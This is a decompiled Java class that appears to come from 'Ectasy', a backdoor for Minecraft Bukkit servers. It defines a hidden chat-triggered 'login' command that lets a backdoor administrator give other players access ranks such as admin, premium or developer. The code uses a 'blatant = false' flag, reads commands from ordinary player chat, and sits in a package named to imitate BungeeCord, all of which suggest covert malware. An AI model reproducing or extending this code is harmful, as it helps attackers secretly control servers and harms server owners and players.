package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "login",
   description = "Makes admin able to login someone",
   blatant = false,
   rank = Rank.ADMIN
)
public class AdminLoginCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length > 0) {
         Player var4 = Bukkit.getPlayer(var3[0]);
         if (var4 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " is not online!");
         } else {
            User var5 = Ectasy.users.get(var4.getName());
            if (var5.rank != Rank.UNAUTHORIZED) {
               ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " is already logged in!");
            } else {
               if (var3.length > 1) {
                  if (var3[1].equalsIgnoreCase("admin")) {
                     var5.rank = Rank.ADMIN;
                     ChatUtil.sendChat(var4, "You have been logged in Ectasy §5admin §fby an administrator.");
                     ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " has been logged in Ectasy §5admin§f.");
                     return;
                  }

                  if (var3[1].equalsIgnoreCase("lite")) {
                     var5.rank = Rank.LITE;
                     ChatUtil.sendChat(var4, "You have been logged in Ectasy §9lite §fby an administrator.");
                     ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " has been logged in Ectasy §9lite§f.");
                     return;
                  }

                  if (var3[1].equalsIgnoreCase("premium")) {
                     var5.rank = Rank.PREMIUM;
                     ChatUtil.sendChat(var4, "You have been logged in Ectasy §6premium §fby an administrator.");
                     ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " has been logged in Ectasy §6premium§f.");
                     return;
                  }

                  if (var3[1].equalsIgnoreCase("developer")) {
                     var5.rank = Rank.DEVELOPER;
                     ChatUtil.sendChat(var4, "You have been logged in Ectasy §adeveloper §fby an administrator.");
                     ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " has been logged in Ectasy §adeveloper§f.");
                     return;
                  }
               }

               var5.rank = Rank.FREE;
               ChatUtil.sendChat(var4, "You have been logged in Ectasy by an administrator.");
               ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " has been logged in!");
            }
         }
      }
   }

   public AdminLoginCommand() {
   }
}
